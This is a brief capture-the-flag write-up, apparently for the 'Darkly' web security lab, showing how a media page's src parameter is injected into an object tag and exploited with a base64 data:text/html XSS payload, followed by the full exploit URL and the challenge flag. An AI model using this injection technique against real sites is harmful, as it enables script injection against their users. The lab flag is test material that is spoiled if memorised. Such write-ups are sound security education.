# media

We go to `/?page=media&src=nsa`. We see an image.

We change the URL to `/?page=media&src=something`. We inspect the page and see this :

```
<object data="something"></object>
```

Our `src` parameter is fed as the `data` of an object. How can we exploit this ?

XSS attacks usually require text, but this is data. The trick is making the object display text anyway. We can do this by using the following format :

```
<object data="data:MIME_TYPE;base64,BASE64_DATA"></object>
```

Now we just need to replace `MIME_TYPE` with `text/html`, and `BASE64_DATA` with `<script>alert</alert>` encoded in base64 (`PHNjcmlwdD5hbGVydDwvYWxlcnQ+`)

We visit the following URL :

```
DARKLY_URL/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydDwvYWxlcnQ+
```

It works ! We get the flag :

```
928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
```
